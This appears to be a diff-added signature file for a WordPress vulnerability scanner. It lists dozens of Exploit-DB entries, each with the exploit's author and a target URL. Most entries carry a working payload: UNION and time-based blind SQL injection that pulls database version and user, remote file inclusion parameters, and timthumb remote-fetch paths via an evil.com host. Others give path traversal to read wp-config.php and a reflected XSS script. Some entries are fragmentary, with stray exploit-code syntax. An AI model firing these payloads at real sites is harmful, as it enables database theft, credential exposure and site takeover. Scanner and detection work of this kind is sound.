+Author: Miroslav Stampar (miroslav.stampar(at)gmail.com @stamparm)
+URL: /wp-content/plugins/link-library/link-library-ajax.php?searchll=-1')/**/AND/**/1=IF(2&gt;1,BENCHMARK(5000000,MD5(CHAR(115,113,108,109,97,112))),0)%23
+*END
+*BEG
+EXPURL: http://www.exploit-db.com/exploits/17872/
+Exploit Title: Multiple Wordpress timthumb.php reuse vulnerabilities
+Author: Ben Schmidt (supernothing (AT) spareclockcycles.org @_supernothing)
+URL: /wp-content/plugins/category-grid-view-gallery/includes/timthumb.php?src=MALICIOUS_URL
+URL: /wp-content/plugins/category-grid-view-gallery/cache/externel_md5(src).php
+URL: /wp-content/plugins/auto-attachments/thumb.php?src=MALICIOUS_URL
+URL: /wp-content/plugins/auto-attachments/cache/external_md5(src).php
+URL: /wp-content/plugins/wp-marketplace/libs/timthumb.php?src=MALICIOUS_URL
+URL: /wp-content/plugins/wp-marketplace/libs/cache/external_md5(src).php
+URL: /wp-content/plugins/dp-thumbnail/timthumb/timthumb.php?src=MALICIOUS_URL
+URL: /wp-content/plugins/dp-thumbnail/timthumb/cache/external_md5(src).php
+URL: /wp-content/plugins/vk-gallery/lib/timthumb.php?src=MALICIOUS_URL
+URL: /wp-content/plugins/vk-gallery/lib/cache/md5(src).php
+URL: /wp-content/plugins/rekt-slideshow/picsize.php?src=MALICIOUS_URL
+URL: /wp-content/plugins/rekt-slideshow/cache/md5(src).php
+URL: /wp-content/plugins/cac-featured-content/timthumb.php?src=MALICIOUS_URL
+URL: /wp-content/plugins/cac-featured-content/temp/md5(src).php
+URL: /wp-content/plugins/rent-a-car/libs/timthumb.php?src=MALICIOUS_URL
+URL: /wp-content/plugins/rent-a-car/libs/cache/external_md5(src).php
+URL: /wp-content/plugins/lisl-last-image-slider/timthumb.php?src=MALICIOUS_URL
+URL: /wp-content/plugins/lisl-last-image-slider/cache/external_md5(src).php
+URL: /wp-content/plugins/islidex/js/timthumb.php?src=MALICIOUS_URL
+URL: /wp-content/plugins/islidex/js/cache/md5(src).php
+URL: /wp-content/plugins/kino-gallery/timthumb.php?src=MALICIOUS_URL
+URL: /wp-content/plugins/kino-gallery/cache/external_md5(src).php
+URL: /wp-content/plugins/cms-pack/timthumb.php?src=MALICIOUS_URL
+URL: /wp-content/plugins/a-gallery/timthumb.php?src=MALICIOUS_URL
+URL: /wp-content/plugins/a-gallery/cache/external_md5(src).php
+URL: /wp-content/plugins/category-list-portfolio-page/scripts/timthumb.php?src=MALICIOUS_URL
+URL: /wp-content/plugins/category-list-portfolio-page/scripts/cache/external_md5(src).php
+URL: /wp-content/plugins/really-easy-slider/inc/thumb.php?src=MALICIOUS_URL
+URL: /wp-content/plugins/really-easy-slider/inc/cache/external_md5(src).php
+Author: Ben Schmidt (supernothing (AT) spareclockcycles.org @_supernothing)
+URL: /wp-content/plugins/verve-meta-boxes/tools/timthumb.php?src=MALICIOUS_URL
+URL: /wp-content/plugins/verve-meta-boxes/tools/cache/external_md5(src).php
+URL: /wp-content/plugins/user-avatar/user-avatar-pic.php?id=0&amp;allowedSites[]=blogger.com&amp;src=http://blogger.com.evil.com/poc.php
+URL: /wp-content/plugins/extend-wordpress/helpers/timthumb/image.php?src=MALICIOUS_URL
+URL: /wp-content/plugins/extend-wordpress/helpers/timthumb/cache/external_md5(src).php
+*END
+*BEG
+EXPURL: http://www.exploit-db.com/exploits/17869/
+Exploit Title: Relocate Upload Wordpress plugin RFI
+Author: Ben Schmidt (supernothing (AT) spareclockcycles.org @_supernothing)
+URL: /wp-content/plugins/relocate-upload/relocate-upload.php?ru_folder=asdf&amp;abspath=RFI
+*END
+*BEG
+EXPURL: http://www.exploit-db.com/exploits/17868/
+Exploit Title: Mini Mail Dashboard Widget Wordpress plugin RFI
+Author: Ben Schmidt (supernothing (AT) spareclockcycles.org @_supernothing)
+URL: /wp-content/plugins/mini-mail-dashboard-widgetwp-mini-mail.php?abspath=RFI (requires POSTing a file with ID wpmm-upload for this to work)
+*END
+*BEG
+EXPURL: http://www.exploit-db.com/exploits/17867/
+Exploit Title: Zingiri Web Shop Wordpress plugin RFI
+Author: Ben Schmidt (supernothing (AT) spareclockcycles.org @_supernothing)
+URL: /wp-content/plugins/zingiri-web-shop/fws/ajax/init.inc.php?wpabspath=RFI OR /fwkfor/ajax/init.inc.php?wpabspath=RFI
+*END
+*BEG
+EXPURL: http://www.exploit-db.com/exploits/17866/
+Exploit Title: Mailing List Wordpress plugin RFI
+Author: Ben Schmidt (supernothing (AT) spareclockcycles.org @_supernothing)
+URL: /wp-content/plugins/mailz/lists/config/config.php?wpabspath=RFI
+*END
+*BEG
+EXPURL: http://www.exploit-db.com/exploits/17865/
+Exploit Title: Disclosure Policy Plugin Wordpress plugin RFI
+Author: Ben Schmidt (supernothing (AT) spareclockcycles.org @_supernothing)
+URL: /wp-content/plugins/disclosure-policy-plugin/functions/action.php?delete=asdf&amp;blogUrl=asdf&amp;abspath=RFI
+*END
+*BEG
+EXPURL: http://www.exploit-db.com/exploits/17864/
+Exploit Title: Livesig Wordpress plugin RFI
+Author: Ben Schmidt (supernothing (AT) spareclockcycles.org @_supernothing)
+URL: /wp-content/plugins/livesig/livesig-ajax-backend.php POST='wp-root=RFI&amp;action=asdf'
+*END
+*BEG
+EXPURL: http://www.exploit-db.com/exploits/17863/
+Exploit Title: Annonces Wordpress plugin RFI
+Author: Ben Schmidt (supernothing (AT) spareclockcycles.org @_supernothing)
+URL: /wp-content/plugins/annonces/includes/lib/photo/uploadPhoto.php?abspath=RFI
+*END
+*BEG
+EXPURL: http://www.exploit-db.com/exploits/17862/
+Exploit Title: Wpeasystats Wordpress plugin RFI
+Author: Ben Schmidt (supernothing (AT) spareclockcycles.org @_supernothing)
+URL: /wp-content/plugins/wpeasystats/export.php?homep=RFI
+*END
+*BEG
+EXPURL: http://www.exploit-db.com/exploits/17861/
+Exploit Title: Allwebmenus Wordpress Menu Plugin Wordpress plugin RFI
+Author: Ben Schmidt (supernothing (AT) spareclockcycles.org @_supernothing)
+URL: /wp-content/plugins/allwebmenus-wordpress-menu-plugin/actions.php POST='abspath=RFI'
+*END
+*BEG
+EXPURL: http://www.exploit-db.com/exploits/17860/
+Exploit Title: Thecartpress Wordpress plugin RFI
+Author: Ben Schmidt (supernothing (AT) spareclockcycles.org @_supernothing)
+URL: /wp-content/plugins/thecartpress/checkout/CheckoutEditor.php?tcp_save_fields=true&amp;tcp_class_name=asdf&amp;tcp_class_path=RFI
+*END
+*BEG
+EXPURL: http://www.exploit-db.com/exploits/17858/
+Exploit Title: WordPress Filedownload Plugin 0.1 (download.php) Remote File Disclosure Vulnerability
+URL: /wp-content/plugins/filedownload/download.php/?path'
+Author: Septemb0x ( CYBER-WARRIOR )
+URL: /wp-content/plugins/filedownload/download.php/?path=../../../wp-config.php
+*END
+*BEG
+EXPURL: http://www.exploit-db.com/exploits/17857/
+Exploit Title: WordPress Count per Day plugin &lt;= 2.17 SQL Injection Vulnerability
+Author: Miroslav Stampar (miroslav.stampar(at)gmail.com @stamparm)
+Authors done one of dirtiest things I've seen in a while :)
+URL: /wp-content/plugins/count-per-day/notes.php?month=-1 UNION ALL SELECT 1,version(),current_user()--%20
+*END
+*BEG
+EXPURL: http://www.exploit-db.com/exploits/17832/
+Exploit Title: WordPress WP e-Commerce plugin &lt;= 3.8.6 SQL Injection Vulnerability
+Author: Miroslav Stampar (miroslav.stampar(at)gmail.com @stamparm)
+*END
+*BEG
+EXPURL: http://www.exploit-db.com/exploits/17828/
+Exploit Title: WordPress WP Forum Server plugin &lt;= 1.7 SQL Injection Vulnerability
+Author: Miroslav Stampar (miroslav.stampar(at)gmail.com @stamparm)
+URL: /wp-content/plugins/forum-server/wpf-insert.php
+URL: /wp-content/plugins/forum-server/wpf-insert.php
+*END
+*BEG
+EXPURL: http://www.exploit-db.com/exploits/17816/
+Exploit Title: WordPress Tune Library plugin &lt;= 2.17 SQL Injection Vulnerability
+Author: Miroslav Stampar (miroslav.stampar(at)gmail.com @stamparm)
+URL: /wp-content/plugins/tune-library/tune-library-ajax.php?letter=-1' UNION ALL SELECT CONCAT_WS(CHAR(59),version(),current_user(),database()),2--%20
+*END
+*BEG
+EXPURL: http://www.exploit-db.com/exploits/17814/
+Exploit Title: Wordpress Event Registration plugin &lt;= 5.44 SQl Injection Vulnerability
+Author: serk
+*END
+*BEG
+EXPURL: http://www.exploit-db.com/exploits/17809/
+Exploit Title: WordPress A to Z Category Listing plugin &lt;= 1.3 SQL Injection Vulnerability
+Author: Miroslav Stampar (miroslav.stampar(at)gmail.com @stamparm)
+URL: /wp-content/plugins/a-to-z-category-listing/post_retrive_ajax.php?R=-1' AND 1=IF(2&gt;1,BENCHMARK(5000000,MD5(CHAR(115,113,108,109,97,112))),0)--%20
+*END
+*BEG
+EXPURL: http://www.exploit-db.com/exploits/17808/
+Exploit Title: WordPress WP-Filebase Download Manager plugin &lt;= 0.2.9 SQL Injection Vulnerability
+Author: Miroslav Stampar (miroslav.stampar(at)gmail.com @stamparm)
+URL: /wp-content/plugins/wp-filebase/wpfb-ajax.php?action=tree&amp;base=-1 AND 1=IF(2&gt;1,BENCHMARK(5000000,MD5(CHAR(115,113,108,109,97,112))),0)--%20&amp;root=source
+*END
+*BEG
+EXPURL: http://www.exploit-db.com/exploits/17801/
+Exploit Title: 1 Flash Gallery Wordpress Plugin Arbitrary File Upload Exploit
+Author: Ben Schmidt
+Author'         =&gt; [ 'Ben Schmidt'],
+URL: /wp-content/plugins/1-flash-gallery/upload.php?action=uploadify&amp;fileext=php',
+*END
+*BEG
+EXPURL: http://www.exploit-db.com/exploits/17798/
+Exploit Title: WordPress Community Events plugin &lt;= 1.2.1 SQL Injection Vulnerability
+Author: Miroslav Stampar (miroslav.stampar(at)gmail.com @stamparm)
+URL: /wp-content/plugins/community-events/tracker.php
+URL: /wp-content/plugins/community-events/tracker.php
+*END
+*BEG
+EXPURL: http://www.exploit-db.com/exploits/17797/
+Exploit Title: WordPress Paid Downloads plugin &lt;= 2.01 SQL Injection Vulnerability
+Author: Miroslav Stampar (miroslav.stampar(at)gmail.com @stamparm)
+URL: /wp-content/plugins/paid-downloads/download.php?download_key=-1' AND 1=IF(2&gt;1,BENCHMARK(5000000,MD5(CHAR(115,113,108,109,97,112))),0)--%20
+*END
+*BEG
+EXPURL: http://www.exploit-db.com/exploits/17794/
+Exploit Title: WordPress Eventify - Simple Events plugin &lt;= 1.7.f SQL Injection Vulnerability
+Author: Miroslav Stampar (miroslav.stampar(at)gmail.com @stamparm)
+URL: /wp-content/plugins/eventify/php/ajax/fetcheventdetails.php
+URL: /wp-content/plugins/eventify/php/ajax/fetcheventdetails.php
+*END
+*BEG
+EXPURL: http://www.exploit-db.com/exploits/17793/
+Exploit Title: WordPress SCORM Cloud plugin &lt;= 1.0.6.6 SQL Injection Vulnerability
+Author: Miroslav Stampar (miroslav.stampar(at)gmail.com @stamparm)
+URL: /wp-content/plugins/scormcloud/ajax.php
+URL: /wp-content/plugins/scormcloud/ajax.php
+*END
+*BEG
+EXPURL: http://www.exploit-db.com/exploits/17791/
+Author List Widget plugin &lt;= 2.0.0 SQL Injection Vulnerability
+Author: Miroslav Stampar (miroslav.stampar(at)gmail.com @stamparm)
+AuthorListCustomSortSave.php?listItem[]=-1 AND 1=IF(2&gt;1,BENCHMARK(5000000,MD5(CHAR(115,113,108,109,97,112))),0)
+*END
+*BEG
+EXPURL: http://www.exploit-db.com/exploits/17790/
+Exploit Title: WordPress post highlights plugin &lt;= 2.2 SQL Injection Vulnerability
+Author: Miroslav Stampar (miroslav.stampar(at)gmail.com @stamparm)
+URL: /wp-content/plugins/post-highlights/ajax/ph_settings.php?id=-1' OR 1=1--%20
+*END
+*BEG
+EXPURL: http://www.exploit-db.com/exploits/17789/
+Exploit Title: WordPress Tweet Old Post plugin &lt;= 3.2.5 SQL Injection
+Author: sherl0ck_ &lt; sherl0ck_ [at] alligatorteam [dot] org &gt;
+URL: /wp-admin/admin.php?page=ExcludePosts
+URL: /wp-admin/admin.php?page=ExcludePosts
+*END
+*BEG
+EXPURL: http://www.exploit-db.com/exploits/17779/
+Exploit Title: WordPress oQey Gallery plugin &lt;= 0.4.8 SQL Injection Vulnerability
+Author: Miroslav Stampar (miroslav.stampar(at)gmail.com @stamparm)
+URL: /wp-content/plugins/oqey-gallery/getimages.php?gal_id=0' UNION ALL SELECT 1,2,3,4,5,6,7,CONCAT_WS(CHAR(95),version(),current_user(),database()),9,10%23
+*END
+*BEG
+EXPURL: http://www.exploit-db.com/exploits/17778/
+Exploit Title: WordPress Zotpress plugin &lt;= 4.4 SQL Injection Vulnerability
+Author: Miroslav Stampar (miroslav.stampar(at)gmail.com @stamparm)
+URL: /wp-content/plugins/zotpress/zotpress.rss.php?api_user_id=1&amp;account_type=test&amp;displayImages=true&amp;displayImageByCitationID=-1' AND 1=IF(2&gt;1,BENCHMARK(5000000,MD5(CHAR(115,113,108,109,97,112))),0)%23
+*END
+*BEG
+EXPURL: http://www.exploit-db.com/exploits/17773/
+Exploit Title: WordPress Facebook Opengraph Meta Plugin plugin &lt;= 1.0 SQL Injection Vulnerability
+Author: Miroslav Stampar (miroslav.stampar(at)gmail.com @stamparm)
+URL: /wp-content/plugins/facebook-opengraph-meta-plugin/all_meta.php?pst_title=1') UNION ALL SELECT CONCAT_WS(CHAR(44),version(),current_user(),database()),2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23--%20&amp;page=100&amp;rows=1
+*END
+*BEG
+EXPURL: http://www.exploit-db.com/exploits/17771/
+Exploit Title: WordPress VideoWhisper Video Presentation plugin &lt;= 1.1 SQL Injection Vulnerability
+Author: Miroslav Stampar (miroslav.stampar(at)gmail.com @stamparm)
+URL: /wp-content/plugins/videowhisper-video-presentation/vp/c_status.php
+URL: /wp-content/plugins/videowhisper-video-presentation/vp/c_status.php
+*END
+*BEG
+EXPURL: http://www.exploit-db.com/exploits/17767/
+Exploit Title: WordPress SearchAutocomplete plugin &lt;= 1.0.8 SQL Injection Vulnerability
+Author: Miroslav Stampar (miroslav.stampar(at)gmail.com @stamparm)
+URL: /wp-content/plugins/search-autocomplete/includes/tags.php?term=-1' UNION ALL SELECT CONCAT_WS(CHAR(44),version(),current_user(),database()),2,3,4--%20
+*END
+*BEG
+EXPURL: http://www.exploit-db.com/exploits/17764/
+Exploit Title: WordPress WP Bannerize plugin &lt;= 2.8.6 SQL Injection Vulnerability
+Author: Miroslav Stampar (miroslav.stampar(at)gmail.com @stamparm)
+URL: /wp-content/plugins/wp-bannerize/ajax_clickcounter.php
+*END
+*BEG
+EXPURL: http://www.exploit-db.com/exploits/17763/
+Exploit Title: WordPress Donation plugin &lt;= 1.0 SQL Injection Vulnerability
+Author: Miroslav Stampar (miroslav.stampar(at)gmail.com @stamparm)
+URL: /wp-content/plugins/wordpress-donation-plugin-with-goals-and-paypal-ipn-by-nonprofitcmsorg/exporttocsv.php?did=-1 AND 1=IF(2&gt;1,BENCHMARK(5000000,MD5(CHAR(115,113,108,109,97,112))),0)--%20
+*END
+*BEG
+EXPURL: http://www.exploit-db.com/exploits/17761/
+Author: Hrvoje Spoljar [ hrvoje.spoljar(at)gmail.com ]
+URL: /wp-content/plugins/image-gallery-with-slideshow/upload-file.php
+*END
+*BEG
+EXPURL: http://www.exploit-db.com/exploits/17760/
+Author: Hrvoje Spoljar [ hrvoje.spoljar(at)gmail.com ]
+URL: /wp-content/plugins/grapefile/grapeupload.php
+*END
+*BEG
+EXPURL: http://www.exploit-db.com/exploits/17759/
+Exploit Title: WordPress Couponer plugin &lt;= 1.2 SQL Injection Vulnerability
+Author: Miroslav Stampar (miroslav.stampar(at)gmail.com @stamparm)
+URL: /wp-content/plugins/couponer/print-coupon.php?ID=-1' UNION ALL SELECT 1,version(),database(),current_user(),5,6,7,8,9,10--%20
+*END
+*BEG
+EXPURL: http://www.exploit-db.com/exploits/17758/
+Exploit Title: WordPress PureHTML plugin &lt;= 1.0.0 SQL Injection Vulnerability
+Author: Miroslav Stampar (miroslav.stampar(at)gmail.com @stamparm)
+URL: /wp-content/plugins/pure-html/alter.php
+*END
+*BEG
+EXPURL: http://www.exploit-db.com/exploits/17757/
+Exploit Title: WordPress yolink Search plugin &lt;= 1.1.4 SQL Injection Vulnerability
+Author: Miroslav Stampar (miroslav.stampar(at)gmail.com @stamparm)
+URL: /wp-content/plugins/yolink-search/includes/bulkcrawl.php
+*END
+*BEG
+EXPURL: http://www.exploit-db.com/exploits/17756/
+Exploit Title: WordPress wp audio gallery playlist plugin &lt;= 0.12 SQL Injection Vulnerability
+Author: Miroslav Stampar (miroslav.stampar(at)gmail.com @stamparm)
+URL: /wp-content/plugins/wp-audio-gallery-playlist/playlist.php?post_gallery=-1' UNION ALL SELECT 1,2,3,4,5,database(),current_user(),8,9,10,11,12,13,14,15,16,17,18,version(),20,21,22,23--%20
+*END
+*BEG
+EXPURL: http://www.exploit-db.com/exploits/17755/
+Exploit Title: WordPress Crawl Rate Tracker plugin &lt;= 2.0.2 SQL Injection Vulnerability
+Author: Miroslav Stampar (miroslav.stampar(at)gmail.com @stamparm)
+URL: /wp-content/plugins/crawlrate-tracker/sbtracking-chart-data.php?chart_data=1&amp;page_url=-1' AND EXTRACTVALUE(1, CONCAT(CHAR(58),@@version,CHAR(58)))--%20
+*END
+*BEG
+EXPURL: http://www.exploit-db.com/exploits/17751/
+Exploit Title: WordPress Event Registration plugin &lt;= 5.4.3 SQL Injection Vulnerability
+Author: Miroslav Stampar (miroslav.stampar(at)gmail.com @stamparm)
+URL: /wp-content/plugins/event-registration/event_registration_export.php?id=-1' AND 1=IF(2&gt;1,BENCHMARK(5000000,MD5(CHAR(115,113,108,109,97,112))),0)--%20
+*END
+*BEG
+EXPURL: http://www.exploit-db.com/exploits/17750/
+Exploit Title: WordPress Advertizer plugin &lt;= 1.0 SQL Injection Vulnerability
+Author: Miroslav Stampar (miroslav.stampar(at)gmail.com @stamparm)
+URL: /wp-content/plugins/advertizer/click_ads.php
+*END
+*BEG
+EXPURL: http://www.exploit-db.com/exploits/17749/
+Exploit Title: WordPress iCopyright(R) Article Tools plugin &lt;= 1.1.4 SQL Injection Vulnerability
+Author: Miroslav Stampar (miroslav.stampar(at)gmail.com @stamparm)
+URL: /wp-content/plugins/copyright-licensing-tools/icopyright_xml.php?id=1' AND 1=1--%20
+*END
+*BEG
+EXPURL: http://www.exploit-db.com/exploits/17748/
+Exploit Title: WordPress SH Slideshow plugin &lt;= 3.1.4 SQL Injection Vulnerability
+Author: Miroslav Stampar (miroslav.stampar(at)gmail.com @stamparm)
+URL: /wp-content/plugins/sh-slideshow/ajax.php
+*END
+*BEG
+EXPURL: http://www.exploit-db.com/exploits/17740/
+Exploit Title: WordPress mySTAT plugin &lt;= 2.6 SQL Injection Vulnerability
+Author: Miroslav Stampar (miroslav.stampar(at)gmail.com @stamparm)
+URL: /wp-content/plugins/mystat/mystat.php?act=stat_img&amp;d1=1&amp;d2=-1') AND 1=IF(2&gt;1,BENCHMARK(5000000,MD5(CHAR(115,113,108,109,97,112))),0)--%20
+*END
+*BEG
+EXPURL: http://www.exploit-db.com/exploits/17739/
+Exploit Title: WordPress Profiles plugin &lt;= 2.0 RC1 SQL Injection Vulnerability
+Author: Miroslav Stampar (miroslav.stampar(at)gmail.com @stamparm)
+URL: /wp-content/plugins/profiles/library/bio-img.php?id=-1' AND 1=IF(2&gt;1,BENCHMARK(5000000,MD5(CHAR(115,113,108,109,97,112))),0)--%20
+*END
+*BEG
+EXPURL: http://www.exploit-db.com/exploits/17738/
+Exploit Title: WordPress Evarisk plugin &lt;= 5.1.3.6 SQL Injection Vulnerability
+Author: Miroslav Stampar (miroslav.stampar(at)gmail.com @stamparm)
+URL: /wp-content/plugins/evarisk/include/ajax.php?post=true&amp;act=reloadCombo&amp;table=wp_eva__veille_groupe_question&amp;nomRacine=-1' UNION ALL SELECT 1,@@version,3,4,5,6,7--%20
+*END
+*BEG
+EXPURL: http://www.exploit-db.com/exploits/17737/
+Exploit Title: WordPress Facebook Promotions plugin &lt;= 1.3.3 SQL Injection Vulnerability
+Author: Miroslav Stampar (miroslav.stampar(at)gmail.com @stamparm)
+URL: /wp-content/plugins/fbpromotions/fbActivate.php?action=activate&amp;name=test&amp;id=-1' AND 1=IF(2&gt;1,BENCHMARK(5000000,MD5(CHAR(115,113,108,109,97,112))),0)--%20
+*END
+*BEG
+EXPURL: http://www.exploit-db.com/exploits/17731/
+Author will be not responsible for any damage.
+URL: /wp-content/plugins/photoracer/mostvoted.php?pid=-1+UNION+SELECT+1,2,3,4,VERSION(),6,7 
+URL: /wp-content/plugins/photoracer/mostvoted.php?prid=-1+UNION+SELECT+1,2,3,4,VERSION(),6,7
+URL: /wp-content/plugins/photoracer/mostviewed.php?pid=-1+UNION+SELECT+1,2,3,4,VERSION(),6,7
+URL: /wp-content/plugins/photoracer/mostviewed.php?prid=-1+UNION+SELECT+1,2,3,4,VERSION(),6,7
+URL: /wp-content/plugins/photoracer/crono.php?pid=-1+UNION+SELECT+1,2,3,4,VERSION(),6,7
+URL: /wp-content/plugins/photoracer/crono.php?prid=-1+UNION+SELECT+1,2,3,4,VERSION(),6,7
+URL: /wp-content/plugins/photoracer/changefrom.php?rid=-1+UNION+SELECT+1,2,3,4,VERSION(),6,7
+URL: /wp-content/plugins/photoracer/changeto.php?rid=-1+UNION+SELECT+1,2,3,4,VERSION(),6,7
+URL: /wp-content/plugins/photoracer/changefrom.php?rid='&gt;&lt;script&gt;alert(1);&lt;/script&gt;
+*END
+*BEG
+EXPURL: http://www.exploit-db.com/exploits/17730/
+Exploit Title: WordPress oQey Headers plugin &lt;= 0.3 SQL Injection Vulnerability
+Author: Miroslav Stampar (miroslav.stampar(at)gmail.com @stamparm)
+URL: /wp-content/plugins/oqey-headers/oqey_settings.php?img_header_id[]=-1' AND 1=IF(2&gt;1,BENCHMARK(5000000,MD5(CHAR(115,113,108,109,97,112))),0)--%20
+*END
+*BEG
+EXPURL: http://www.exploit-db.com/exploits/17729/
+Exploit Title: WordPress Collision Testimonials plugin &lt;= 3.0 SQL Injection Vulnerability
+Author: Miroslav Stampar (miroslav.stampar(at)gmail.com @stamparm)
+URL: /wp-admin/admin.php?page=testimonials&amp;featQuote&amp;id=-1 AND 1=IF(2&gt;1,BENCHMARK(5000000,MD5(CHAR(115,113,108,109,97,112))),0)
+*END
+*BEG
+EXPURL: http://www.exploit-db.com/exploits/17728/
+Exploit Title: WordPress Super CAPTCHA plugin &lt;= 2.2.4 SQL Injection Vulnerability
+Author: Miroslav Stampar (miroslav.stampar(at)gmail.com @stamparm)
+URL: /wp-admin/admin.php?page=super-captcha/Logs&amp;markspam=-1' OR SLEEP(5)--%20
+*END
+*BEG
+EXPURL: http://www.exploit-db.com/exploits/17725/
+Exploit Title: WordPress MM Forms Community plugin &lt;= 1.2.3 SQL Injection Vulnerability
+Author: Miroslav Stampar (miroslav.stampar(at)gmail.com @stamparm)
+URL: /wp-content/plugins/mm-forms-community/includes/edit_details.php?ID=-1' AND 1=IF(2&gt;1,BENCHMARK(5000000,MD5(CHAR(115,113,108,109,97,112))),0)--%20
+*END
+*BEG
+EXPURL: http://www.exploit-db.com/exploits/17724/
+Exploit Title: WordPress Js-appointment plugin &lt;= 1.5 SQL Injection Vulnerability
+Author: Miroslav Stampar (miroslav.stampar(at)gmail.com @stamparm)
+URL: /wp-content/plugins/js-appointment/searchdata.php?search_action=searchadv&amp;cat=-1' AND 1=IF(2&gt;1,BENCHMARK(5000000,MD5(CHAR(115,113,108,109,97,112))),0)--%20
+*END
+*BEG
+EXPURL: http://www.exploit-db.com/exploits/17720/
+Exploit Title: WordPress Photoracer plugin &lt;= 1.0 SQL Injection Vulnerability
+Author: evilsocket ( evilsocket [at] gmail [dot] com )
+URL: /wp-content/plugins/photoracer/viewimg.php?id=-1 UNION SELECT 0,1,2,3,4,VERSION(),6,7,8
+*END
+*BEG
+EXPURL: http://www.exploit-db.com/exploits/17716/
+Exploit Title: WordPress SendIt plugin &lt;= 1.5.9 Blind SQL Injection Vulnerability
+Author: evilsocket ( evilsocket [at] gmail [dot] com )
+URL: /wp-content/plugins/sendit/submit.php
+*END
+*BEG
+EXPURL: http://www.exploit-db.com/exploits/17707/
+Exploit Title: WordPress MM Duplicate plugin &lt;= 1.2 SQL Injection Vulnerability
+Author: Miroslav Stampar (miroslav.stampar(at)gmail.com @stamparm)
+*END
+*BEG
+EXPURL: http://www.exploit-db.com/exploits/17704/
+Exploit Title: WordPress UnGallery plugin &lt;= 1.5.8 Local File Disclosure Vulnerability
+Author: Miroslav Stampar (miroslav.stampar(at)gmail.com @stamparm)
+URL: /wp-content/plugins/ungallery/source_vuln.php?pic=../../../../../../../..%s' % FILEPATH)
+*END
+*BEG
+EXPURL: http://www.exploit-db.com/exploits/17702/
+Author'         =&gt; [
+*END
+*BEG
+EXPURL: http://www.exploit-db.com/exploits/17689/
+Exploit Title: WordPress Menu Creator plugin &lt;= 1.1.7 SQL Injection Vulnerability
+Author: Miroslav Stampar (miroslav.stampar(at)gmail.com @stamparm)
+URL: /wp-content/plugins/wp-menu-creator/updateSortOrder.php?menu_id=-1 AND 1=IF(2&gt;1,BENCHMARK(5000000,MD5(CHAR(115,113,108,109,97,112))),0)
+*END
+*BEG
+EXPURL: http://www.exploit-db.com/exploits/17688/
+Exploit Title: WordPress Allow PHP in Posts and Pages plugin &lt;= 2.0.0.RC1 SQL Injection Vulnerability
+Author: Miroslav Stampar (miroslav.stampar(at)gmail.com @stamparm)
+URL: /wp-content/plugins/allow-php-in-posts-and-pages/alter.php
+*END
+*BEG
+EXPURL: http://www.exploit-db.com/exploits/17687/
+Exploit Title: WordPress Global Content Blocks plugin &lt;= 1.2 SQL Injection Vulnerability
+Author: Miroslav Stampar (miroslav.stampar(at)gmail.com @stamparm)
+URL: /wp-content/plugins/global-content-blocks/gcb/gcb_export.php?gcb=1 AND 1=1
+*END
+*BEG
+EXPURL: http://www.exploit-db.com/exploits/17686/
+Exploit Title: WordPress Ajax Gallery plugin &lt;= 3.0 SQL Injection Vulnerability
+Author: Miroslav Stampar (miroslav.stampar(at)gmail.com @stamparm)
+URL: /wp-content/plugins/ajaxgallery/utils/list.php?delete=1&amp;gId=-1 AND 1=IF(2&gt;1,BENCHMARK(5000000,MD5(CHAR(115,113,108,109,97,112))),0)
+*END
+*BEG
+EXPURL: http://www.exploit-db.com/exploits/17684/
+Exploit Title: WordPress WP Forum plugin &lt;= 1.7.8 SQL Injection Vulnerability
+Author: Miroslav Stampar (miroslav.stampar(at)gmail.com @stamparm)
+URL: /wp-content/plugins/wpforum/sendmail.php?action=quote&amp;id=-1 UNION ALL SELECT @@version,2,3
+*END
+*BEG
+EXPURL: http://www.exploit-db.com/exploits/17683/
+Exploit Title: WordPress WP DS FAQ plugin &lt;= 1.3.2 SQL Injection Vulnerability
+Author: Miroslav Stampar (miroslav.stampar(at)gmail.com @stamparm)
+URL: /wp-content/plugins/wp-ds-faq/ajax.php
+*END
+*BEG
+EXPURL: http://www.exploit-db.com/exploits/17681/
+Exploit Title: WordPress OdiHost Newsletter plugin &lt;= 1.0 SQL Injection Vulnerability
+Author: Miroslav Stampar (miroslav.stampar(at)gmail.com @stamparm)
+URL: /wp-content/plugins/odihost-newsletter-plugin/includes/openstat.php?uid=-1&amp;id=-1 AND 1=IF(2&gt;1,BENCHMARK(5000000,MD5(CHAR(115,113,108,109,97,112))),0)
+*END
+*BEG
+EXPURL: http://www.exploit-db.com/exploits/17680/
+Exploit Title: WordPress Easy Contact Form Lite plugin &lt;= 1.0.7 SQL Injection Vulnerability
+Author: Miroslav Stampar (miroslav.stampar(at)gmail.com @stamparm)
+URL: /wp-content/plugins/easy-contact-form-lite/requests/sort_row.request.php
+*END
+*BEG
+EXPURL: http://www.exploit-db.com/exploits/17679/
+Exploit Title: WordPress WP Symposium plugin &lt;= 0.64 SQL Injection Vulnerability
+Author: Miroslav Stampar (miroslav.stampar(at)gmail.com @stamparm)
+URL: /wp-content/plugins/wp-symposium/uploadify/get_profile_avatar.php?uid=-1 AND 1=IF(2&gt;1,BENCHMARK(5000000,MD5(CHAR(115,113,108,109,97,112))),0)
+*END
+*BEG
+EXPURL: http://www.exploit-db.com/exploits/17678/
+Exploit Title: WordPress Contus HD FLV Player plugin &lt;= 1.3 SQL Injection Vulnerability
+Author: Miroslav Stampar (miroslav.stampar(at)gmail.com @stamparm)
+URL: /wp-content/plugins/contus-hd-flv-player/process-sortable.php?playid=-1 AND 1=IF(2&gt;1,BENCHMARK(5000000,MD5(CHAR(115,113,108,109,97,112))),0)&amp;listItem[]=1
+*END
+*BEG
+EXPURL: http://www.exploit-db.com/exploits/17677/
+Exploit Title: WordPress File Groups plugin &lt;= 1.1.2 SQL Injection Vulnerability
+Author: Miroslav Stampar (miroslav.stampar(at)gmail.com @stamparm)
+URL: /wp-content/plugins/file-groups/download.php?fgid=-1 AND 1=BENCHMARK(5000000,MD5(CHAR(87,120,109,121)))
+*END
+*BEG
+EXPURL: http://www.exploit-db.com/exploits/17673/
+Exploit Title: WordPress IP-Logger plugin &lt;= 3.0 SQL Injection Vulnerability
+Author: Miroslav Stampar (miroslav.stampar(at)gmail.com @stamparm)
+URL: /wp-content/plugins/ip-logger/map-details.php?lat=-1 UNION ALL SELECT @@version,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--%20&amp;lon=-1&amp;blocked=-1
+*END
+*BEG
+EXPURL: http://www.exploit-db.com/exploits/17628/
+Exploit Title: Media Library Categories &lt;= 1.0.6 SQL Injection Vulnerability
+Author: Miroslav Stampar (miroslav.stampar(at)gmail.com @stamparm)
